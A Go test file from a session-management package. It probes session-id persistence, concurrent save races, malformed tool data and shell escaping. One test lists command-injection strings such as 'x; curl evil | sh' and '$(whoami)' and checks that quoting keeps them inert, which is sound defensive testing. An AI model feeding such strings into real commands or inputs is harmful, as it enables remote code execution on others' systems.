package session

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"al.essio.dev/pkg/shellescape"
	"github.com/asheshgoplani/agent-deck/internal/statedb"
)

// Adversarial probes for PR #1885 (persist custom-tool conversation ids).

// TestAttack_ClearedFlagConsumedAfterSave is the concurrent-writer sticky hole:
// after SetField(clear) + Save, genericSessionIDCleared must not remain true.
// Otherwise a later unrelated Save from the same in-memory Instance re-emits
// intentional clear and wipes a concurrent WriteGenericSessionBinding.
func TestAttack_ClearedFlagConsumedAfterSave(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	storage := newTestStorage(t)

	inst := NewInstance("clear-consume", "/tmp/clear-consume")
	inst.ID = "clear-consume"
	inst.Tool = "shell"
	inst.GenericSessionID = "first-id"
	inst.GenericDetectedAt = time.Now()
	if err := storage.SaveWithGroups([]*Instance{inst}, NewGroupTreeWithGroups([]*Instance{inst}, nil)); err != nil {
		t.Fatal(err)
	}

	if _, _, err := SetField(inst, FieldToolSessionID, "", nil); err != nil {
		t.Fatal(err)
	}
	if !inst.genericSessionIDCleared {
		t.Fatal("SetField clear must set genericSessionIDCleared")
	}
	if err := storage.SaveWithGroups([]*Instance{inst}, NewGroupTreeWithGroups([]*Instance{inst}, nil)); err != nil {
		t.Fatal(err)
	}
	if inst.genericSessionIDCleared {
		t.Fatal("genericSessionIDCleared must be consumed after successful save")
	}

	// Concurrent writer re-binds while this process still holds the empty in-memory snapshot.
	if err := storage.db.WriteGenericSessionBinding(inst.ID, "new-id", time.Now()); err != nil {
		t.Fatal(err)
	}
	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	if loaded[0].GenericSessionID != "new-id" {
		t.Fatalf("concurrent bind lost: %q", loaded[0].GenericSessionID)
	}

	// Unrelated full save from stale empty snapshot must sticky-preserve new-id.
	inst.Title = "renamed-after-clear"
	if err := storage.SaveWithGroups([]*Instance{inst}, NewGroupTreeWithGroups([]*Instance{inst}, nil)); err != nil {
		t.Fatal(err)
	}
	loaded2, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	if got := loaded2[0].GenericSessionID; got != "new-id" {
		t.Fatalf("stale post-clear save wiped concurrent binding: got %q want new-id", got)
	}
}

// TestAttack_BashLcShellInjection proves formatGenericResumeCommand + bash -lc
// keep hostile session ids as a single argv (no injection).
func TestAttack_BashLcShellInjection(t *testing.T) {
	hostile := []string{
		"x; curl evil | sh",
		"$(whoami)",
		"id with spaces",
		"id'quote",
		"id`id`",
		"evil;id",
		"ok\nid",
		`id"; curl evil; echo "`,
		`id'; curl evil; #`,
		"$(echo PWNED)",
	}
	for i, sid := range hostile {
		name := "h" + string(rune('a'+i))
		t.Run("space_"+name, func(t *testing.T) {
			assertBashLcArgv(t, "--resume", sid)
		})
		t.Run("equals_"+name, func(t *testing.T) {
			assertBashLcArgv(t, "--session=", sid)
		})
	}
}

func assertBashLcArgv(t *testing.T, flag, sid string) {
	t.Helper()
	cmdStr := formatGenericResumeCommand("_tool", flag, sid, "")
	full := `_tool(){ echo ARGC:$#; i=1; for a; do printf 'ARGV%d:%s\n' "$i" "$a"; i=$((i+1)); done; }; ` + cmdStr
	out, err := exec.Command("bash", "-lc", full).CombinedOutput()
	if err != nil {
		t.Fatalf("bash -lc failed: %v\ncmd=%q\nout=%s", err, cmdStr, out)
	}
	got := string(out)
	if strings.HasSuffix(flag, "=") {
		if !strings.Contains(got, "ARGC:1") {
			t.Fatalf("equals form want ARGC:1, out:\n%s\ncmd=%q", got, cmdStr)
		}
		if !strings.Contains(got, "ARGV1:"+flag) {
			t.Fatalf("equals form missing glued flag in:\n%s", got)
		}
	} else {
		if !strings.Contains(got, "ARGC:2") {
			t.Fatalf("space form want ARGC:2, out:\n%s\ncmd=%q", got, cmdStr)
		}
		if !strings.Contains(got, "ARGV2:"+sid) {
			t.Fatalf("space form ARGV2 mismatch, out:\n%s\ncmd=%q", got, cmdStr)
		}
	}
	if strings.Contains(sid, "PWNED") && strings.Contains(got, "PWNED") && !strings.Contains(got, "$(echo PWNED)") {
		t.Fatalf("command substitution executed:\n%s", got)
	}
	if strings.ContainsAny(sid, ";$`\n'\"") {
		if !strings.Contains(cmdStr, shellescape.Quote(sid)) {
			t.Fatalf("hostile id not shellescape-quoted: cmd=%q", cmdStr)
		}
	}
}

// TestAttack_StickyVsClearContracts hits design contracts 1–3.
func TestAttack_StickyVsClearContracts(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	storage := newTestStorage(t)

	inst := NewInstance("sticky-contract", "/tmp")
	inst.ID = "sticky-contract"
	inst.Tool = "shell"
	inst.GenericSessionID = "bind-A"
	inst.GenericDetectedAt = time.Now()
	if err := storage.SaveWithGroups([]*Instance{inst}, NewGroupTreeWithGroups([]*Instance{inst}, nil)); err != nil {
		t.Fatal(err)
	}

	// (1) Sticky: full save with empty id + cleared=false preserves A.
	stale := NewInstance("sticky-contract", "/tmp")
	stale.ID = inst.ID
	stale.Tool = "shell"
	stale.GenericSessionID = ""
	stale.genericSessionIDCleared = false
	if err := storage.SaveWithGroups([]*Instance{stale}, NewGroupTreeWithGroups([]*Instance{stale}, nil)); err != nil {
		t.Fatal(err)
	}
	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	if loaded[0].GenericSessionID != "bind-A" {
		t.Fatalf("sticky failed: %q", loaded[0].GenericSessionID)
	}

	// (2) Intentional clear sticks across reload.
	live := loaded[0]
	if _, _, err := SetField(live, FieldToolSessionID, "", nil); err != nil {
		t.Fatal(err)
	}
	if err := storage.SaveWithGroups([]*Instance{live}, NewGroupTreeWithGroups([]*Instance{live}, nil)); err != nil {
		t.Fatal(err)
	}
	loaded2, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	if loaded2[0].GenericSessionID != "" {
		t.Fatalf("clear did not stick: %q", loaded2[0].GenericSessionID)
	}
}

// TestAttack_BuiltinClaudeNoGenericResume — design contract 6.
func TestAttack_BuiltinClaudeNoGenericResume(t *testing.T) {
	home := isolateToolConfigHome(t)
	writeResumeToolConfig(t, home, "not-claude", "--resume")
	if GetToolDef("claude") != nil {
		t.Fatal("GetToolDef(claude) must be nil")
	}
	inst := &Instance{
		Tool:             "claude",
		Command:          "claude",
		ClaudeSessionID:  "claude-real",
		GenericSessionID: "accidental-generic",
	}
	if inst.CanRestartGeneric() {
		t.Fatal("CanRestartGeneric must be false for builtin claude")
	}
	cmd := inst.buildGenericCommand("claude")
	if strings.Contains(cmd, "accidental-generic") {
		t.Fatalf("must not inject accidental generic id: %q", cmd)
	}
	if got := inst.DisplaySessionID(); got != "claude-real" {
		t.Fatalf("DisplaySessionID = %q, want claude-real", got)
	}
}

// TestAttack_WhitespaceOnlyNoResume — attack list #8.
func TestAttack_WhitespaceOnlyNoResume(t *testing.T) {
	home := isolateToolConfigHome(t)
	writeResumeToolConfig(t, home, "fake-tool", "--resume")
	for _, sid := range []string{"", "   ", "\t\n"} {
		inst := &Instance{Tool: "fake-tool", Command: "fake-tool", GenericSessionID: sid}
		if inst.GetGenericSessionID() != "" {
			t.Fatalf("sid=%q GetGenericSessionID=%q", sid, inst.GetGenericSessionID())
		}
		if inst.CanRestartGeneric() {
			t.Fatalf("sid=%q CanRestartGeneric true", sid)
		}
		cmd := inst.buildGenericCommand("fake-tool")
		if strings.Contains(cmd, "--resume") {
			t.Fatalf("sid=%q injected resume: %q", sid, cmd)
		}
	}
	t.Setenv("HOME", t.TempDir())
	storage := newTestStorage(t)
	inst := NewInstance("ws-db", "/tmp")
	inst.ID = "ws-db"
	inst.Tool = "shell"
	if err := storage.SaveWithGroups([]*Instance{inst}, NewGroupTreeWithGroups([]*Instance{inst}, nil)); err != nil {
		t.Fatal(err)
	}
	if err := storage.db.WriteGenericSessionBinding(inst.ID, "   ", time.Now()); err != nil {
		t.Fatal(err)
	}
	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	if loaded[0].GetGenericSessionID() != "" {
		t.Fatalf("whitespace binding must trim to empty, got %q", loaded[0].GetGenericSessionID())
	}
}

// TestAttack_MalformedToolDataNoPanic — non-string generic_session_id.
func TestAttack_MalformedToolDataNoPanic(t *testing.T) {
	cases := []json.RawMessage{
		json.RawMessage(`{"generic_session_id":123}`),
		json.RawMessage(`{"generic_session_id":true}`),
		json.RawMessage(`{"generic_session_id":null}`),
		json.RawMessage(`{"generic_session_id":["a"]}`),
		json.RawMessage(`{"generic_session_id":{"x":1}}`),
	}
	for _, td := range cases {
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Errorf("panic on %s: %v", td, r)
				}
			}()
			_ = ReadGenericSessionIDFromToolData(td)
			_ = ReadGenericDetectedAtFromToolData(td)
		}()
	}
}

// TestAttack_TwoSeatsIndependentAfterLoad — attack list #10.
func TestAttack_TwoSeatsIndependentAfterLoad(t *testing.T) {
	home := isolateToolConfigHome(t)
	writeResumeToolConfig(t, home, "shared-cli", "--resume")
	storage := newTestStorage(t)
	proj := filepath.Join(home, "proj")
	_ = os.MkdirAll(proj, 0o700)

	a := NewInstance("seat-a", proj)
	a.ID = "seat-a"
	a.Tool = "shared-cli"
	a.Command = "shared-cli"
	a.GenericSessionID = "id-A"
	a.GenericDetectedAt = time.Now()

	b := NewInstance("seat-b", proj)
	b.ID = "seat-b"
	b.Tool = "shared-cli"
	b.Command = "shared-cli"
	b.GenericSessionID = "id-B"
	b.GenericDetectedAt = time.Now()

	if err := storage.SaveWithGroups([]*Instance{a, b}, NewGroupTreeWithGroups([]*Instance{a, b}, nil)); err != nil {
		t.Fatal(err)
	}
	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	byID := map[string]*Instance{}
	for _, inst := range loaded {
		inst.tmuxSession = nil
		byID[inst.ID] = inst
	}
	ca := byID["seat-a"].buildGenericCommand("shared-cli")
	cb := byID["seat-b"].buildGenericCommand("shared-cli")
	if strings.Contains(ca, "id-B") || strings.Contains(cb, "id-A") {
		t.Fatalf("cross-talk ca=%q cb=%q", ca, cb)
	}
	if !strings.Contains(ca, "id-A") || !strings.Contains(cb, "id-B") {
		t.Fatalf("missing ids ca=%q cb=%q", ca, cb)
	}
}

// TestAttack_PersistNilSafeAndSiblings.
func TestAttack_PersistNilSafeAndSiblings(t *testing.T) {
	if err := PersistGenericSessionBinding(nil, nil); err != nil {
		t.Fatal(err)
	}
	if err := PersistGenericSessionBinding(nil, &Instance{ID: "x"}); err != nil {
		t.Fatal(err)
	}

	t.Setenv("HOME", t.TempDir())
	storage := newTestStorage(t)
	inst := NewInstance("sib", "/tmp")
	inst.ID = "sib"
	inst.Tool = "claude"
	inst.ClaudeSessionID = "claude-keep"
	inst.Color = "#abc"
	if err := storage.SaveWithGroups([]*Instance{inst}, NewGroupTreeWithGroups([]*Instance{inst}, nil)); err != nil {
		t.Fatal(err)
	}
	if err := storage.db.WriteGenericSessionBinding(inst.ID, "g1", time.Now()); err != nil {
		t.Fatal(err)
	}
	if err := storage.db.WriteGenericSessionBinding(inst.ID, "", time.Time{}); err != nil {
		t.Fatal(err)
	}
	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	if loaded[0].GenericSessionID != "" {
		t.Fatalf("generic not cleared: %q", loaded[0].GenericSessionID)
	}
	if loaded[0].ClaudeSessionID != "claude-keep" {
		t.Fatalf("claude clobbered: %q", loaded[0].ClaudeSessionID)
	}
	if loaded[0].Color != "#abc" {
		t.Fatalf("color clobbered: %q", loaded[0].Color)
	}
}

// TestAttack_JSONRoundTripSpecialChars through tool_data.
func TestAttack_JSONRoundTripSpecialChars(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	storage := newTestStorage(t)
	ids := []string{
		`id"with"quotes`,
		`id\with\backslashes`,
		`unicode-日本語`,
		`emoji-🔐`,
	}
	var instances []*Instance
	for i, id := range ids {
		inst := NewInstance("j", "/tmp")
		inst.ID = "j" + string(rune('0'+i))
		inst.Tool = "shell"
		inst.GenericSessionID = id
		inst.GenericDetectedAt = time.Now()
		instances = append(instances, inst)
	}
	if err := storage.SaveWithGroups(instances, NewGroupTreeWithGroups(instances, nil)); err != nil {
		t.Fatal(err)
	}
	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	byID := map[string]string{}
	for _, inst := range loaded {
		byID[inst.ID] = inst.GenericSessionID
	}
	for i, id := range ids {
		key := "j" + string(rune('0'+i))
		if byID[key] != id {
			t.Fatalf("%s: want %q got %q", key, id, byID[key])
		}
	}
}

// TestAttack_ExplicitClearMergeUnit — sticky honors explicit empty.
func TestAttack_ExplicitClearMergeUnit(t *testing.T) {
	old := json.RawMessage(`{"generic_session_id":"keep","color":"#x"}`)
	new_ := WriteGenericSessionIDToToolData(json.RawMessage(`{"color":"#x"}`), "", time.Time{}, true)
	merged := statedb.MergeToolDataExtras(old, new_)
	if got := ReadGenericSessionIDFromToolData(merged); got != "" {
		t.Fatalf("explicit clear must win: %s", merged)
	}
}
